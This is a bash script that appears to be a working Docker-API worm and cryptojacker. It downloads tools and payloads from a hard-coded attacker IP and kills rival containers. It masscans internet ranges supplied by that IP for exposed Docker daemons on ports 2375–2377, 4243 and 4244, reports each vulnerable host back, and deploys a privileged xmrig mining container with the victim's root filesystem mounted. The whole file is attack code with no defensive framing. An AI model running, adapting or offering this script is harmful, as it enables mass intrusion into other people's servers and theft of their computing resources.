#!/bin/bash
RATE_TO_SCAN=500000


if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y wget curl jq bash masscan libpcap-dev ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y wget curl jq bash masscan libpcap-devel ; fi
if ! type zgrab 2>/dev/null 1>/dev/null; then wget http://45.9.148.85/bin/zgrab -O /usr/bin/zgrab && chmod +x /usr/bin/zgrab ; fi
if ! type docker 2>/dev/null; then curl -sLk https://get.docker.com | bash ; fi
docker stop $(docker ps | grep -v 'CONTAINER' | grep -v 'tntpwner2\|b0rgdrone24\|dockgeddon' | awk '{print $1}')
clear ; echo "" ; echo ""
sleep 6

chmod +x /usr/bin/zgrab
chmod +x /root/dockerd
chmod +x /root/TNTfeatB0RG

/root/TNTfeatB0RG
nice -n -20 /root/dockerd || /root/dockerd

dAPIpwn(){
range=$1
port=$2
rate=$3
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan $range -p$port --rate=$rate | awk '{print $6}'| zgrab --senders 200 --port $port --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";

for ipaddy in ${!rndstr}
do

TARGET=$ipaddy:$port

echo '##################################################'
curl -sLk http://45.9.148.85/input/da.php?vuln=$TARGET -o /dev/null
echo $TARGET

timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged --name dockgeddon -v /:/host xululol/xmrig

done
}

while true 
do
RANGE=$(curl -sLk http://45.9.148.85/input/da_range.php)".0.0.0/8"
dAPIpwn $RANGE 2375 $RATE_TO_SCAN
dAPIpwn $RANGE 2376 $RATE_TO_SCAN
dAPIpwn $RANGE 2377 $RATE_TO_SCAN
dAPIpwn $RANGE 4244 $RATE_TO_SCAN
dAPIpwn $RANGE 4243 $RATE_TO_SCAN
done 


dAPIpwn(){
    ip_list_file=$1
    port=$2
    while read -r ipaddy
    do
        TARGET=$ipaddy:$port
        echo '##################################################'
        echo $TARGET
        timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged --name dockgeddon -v /:/host xululol/xmrig
    done < "$ip_list_file"
}